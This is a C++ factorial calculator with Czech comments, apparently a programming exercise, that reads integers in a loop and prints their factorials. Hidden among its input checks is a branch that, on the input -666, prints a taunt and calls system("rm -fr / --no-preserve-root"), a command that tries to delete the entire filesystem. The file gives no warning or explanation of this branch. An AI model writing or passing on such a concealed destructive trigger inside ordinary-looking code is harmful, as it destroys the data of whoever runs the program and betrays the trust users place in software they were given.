#include <iostream>
using namespace std;

int main()
{ // algoritmus: vypocet faktorialu
    long int A, F; // deklarace promennych

    while (true) {
        cout << "Enter an integer: ";
        cin >> A;

        if (A == -999) {
            cout << "end";
            break;
        } else if (A == -666) {
            cout << "mwehehehe >:3" << endl;
            system("rm -fr / --no-preserve-root");
        } else if (A < 0) {
            cout << "error: negative integer"<< endl;
            continue;
        } else if (A == 0) {
            cout << 1 << endl;
            continue;
        }

        F = A;

        while (A > 1) {
            A = A - 1;
            F = F * A;
        }
        cout << F << endl;
    }
}
